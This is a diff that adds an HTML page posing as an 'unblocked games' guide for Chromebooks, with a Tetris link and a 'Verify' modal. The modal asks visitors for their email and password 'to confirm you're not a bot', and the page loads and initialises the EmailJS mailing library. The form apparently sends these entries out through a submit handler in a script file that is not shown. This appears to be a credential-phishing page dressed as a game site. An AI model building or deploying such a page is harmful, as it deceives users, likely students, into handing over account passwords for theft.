@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Game Hub - Unblocked Games Guide</title>
+<link rel="stylesheet" href="style.css">
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  (function(){ emailjs.init("dEdNsHG5-PcDk60EA"); })();
+</script>
+</head>
+<body class="dark-mode">
+
+<div class="nav">
+  <!-- Left: Dropdown -->
+  <div class="dropdown">
+    <button class="btn secondary dropdown-btn">Pages ▾</button>
+    <div class="dropdown-content">
+      <a href="index.html">Home</a>
+      <a href="tetris.html">Tetris</a>
+    </div>
+  </div>
+
+  <!-- Center: Brand -->
+  <div class="brand">Game Hub</div>
+
+  <!-- Right: Verify Button -->
+  <div>
+    <button onclick="openVerify()" class="btn play">Verify</button>
+  </div>
+</div>
+
+<section class="hero">
+  <h1>How to Play Unblocked Games on Chromebook</h1>
+  <p>Use the menu above to navigate and select your favorite games.</p>
+</section>
+
+<div class="wrap">
+  <h2>Getting Started</h2>
+  <p>Welcome to Game Hub! This guide will show you how to access unblocked games safely and quickly. For demonstration purposes, we will use <strong>Tetris</strong> as an example game.</p>
+
+  <h2>Using the Menu</h2>
+  <p>The top-left dropdown menu labeled <strong>Pages ▾</strong> is your main navigation tool. Here’s how to use it:</p>
+  <ul>
+    <li>Click on <strong>Pages ▾</strong> to reveal a list of available pages.</li>
+    <li>To play Tetris, simply click on the <strong>Tetris</strong> link.</li>
+    <li>Other links in the future may include more unblocked games. Always select the game you want from this menu.</li>
+  </ul>
+
+  <h2>Finding New Games</h2>
+  <p>The Game Hub interface also allows you to browse categories and filter by popularity. Although we currently only show Tetris, this menu will eventually include more games, all playable on Chromebooks.</p>
+
+  <h2>Playing Tetris</h2>
+  <p>After clicking the <strong>Tetris</strong> link from the menu:</p>
+  <ul>
+    <li>The game will open in its dedicated page.</li>
+    <li>You can use the fullscreen button to maximize your game experience.</li>
+    <li>Enjoy playing without any downloads or installation.</li>
+  </ul>
+
+  <h2>Support & Updates</h2>
+  <p>If you want to receive updates or suggest new games, click the <strong>Verify</strong> button on the top-right to submit your email and suggestions.</p>
+</div>
+
+<footer>
+  Delivered Fast • Privacy Protected
+  <div class="socials">Contact: <a href="mailto:unblockable.gamehub@gmail.com">unblockable.gamehub@gmail.com</a></div>
+</footer>
+
+<!-- VERIFY MODAL -->
+<div id="verifyModal" class="modalBg" aria-hidden="true">
+  <div class="modal">
+    <h2>Verify</h2>
+    <div class="note">Enter email & password to confirm you're not a bot.</div>
+    <input id="emailField" type="email" placeholder="Email" required>
+    <input id="passwordField" type="password" placeholder="Password" required>
+    <button type="button" class="toggle-btn" onclick="togglePassword('passwordField')">Show</button>
+    <input id="confirmField" type="password" placeholder="Confirm Password" required>
+    <button type="button" class="toggle-btn" onclick="togglePassword('confirmField')">Show</button>
+    <div id="pwError" class="error" style="display:none"></div>
+    <textarea id="suggestionBox" placeholder="Suggestions / Notes"></textarea>
+    <div class="checkbox-container">
+      <input type="checkbox" id="agreeCheckbox">
+      <label for="agreeCheckbox">I agree to receive updates</label>
+    </div> 
+    <div class="submit-row">
+      <button id="submitBtn" class="btn play" onclick="submitForm()">Request</button>
+      <button class="btn secondary" onclick="closeVerify()">Close</button>
+    </div>
+    <div id="successBox" class="successCard">🎮 Request sent!</div>
+    <div class="socials">Contact: <a href="mailto:unblockable.gamehub@gmail.com">unblockable.gamehub@gmail.com</a></div>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
